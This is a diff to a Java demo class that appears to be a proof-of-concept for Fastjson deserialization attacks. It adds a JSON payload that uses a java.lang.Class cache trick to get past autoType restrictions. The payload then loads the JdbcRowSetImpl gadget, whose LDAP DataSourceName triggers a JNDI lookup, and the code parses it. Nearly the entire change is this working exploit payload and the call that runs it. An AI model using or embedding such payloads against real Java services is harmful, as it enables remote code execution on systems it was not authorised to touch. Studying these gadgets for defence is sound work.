@@ -24,7 +24,8 @@ public class demo {
         String s3 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/HfNCBhSf\",\"AutoCommit\":\"true\"}";
         //Object object1 = JSON.parse(s3);
         //Object object2 = JSON.parseObject(s3, Person.class);
-        Object object3 = JSON.parseObject(s3);
+        String s4 = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/cgQuBZlq\",\"AutoCommit\":\"false\"}}";
+        Object object3 = JSON.parseObject(s4);
 //        System.out.println("-------------");
 //        System.out.println("object1:");
 //        System.out.println(object1);
